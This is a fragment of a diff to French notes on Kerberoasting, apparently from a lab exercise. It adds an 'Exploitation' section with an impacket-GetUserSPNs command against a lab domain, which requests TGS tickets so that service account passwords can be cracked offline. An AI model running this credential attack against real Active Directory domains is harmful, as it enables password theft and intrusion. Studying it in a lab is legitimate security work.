@@ -7,3 +7,8 @@ L’objectif est de recuperer les ticket TGS qui contient le hash du compte SPN,
 puis cracker le mot de passe off-line pour l’avoir en claire.
 
 
+# Exploitation
+
+```
+impacket-GetUserSPNs lab-test.local/it_2:************* -dc-ip 192.168.174.133
+```
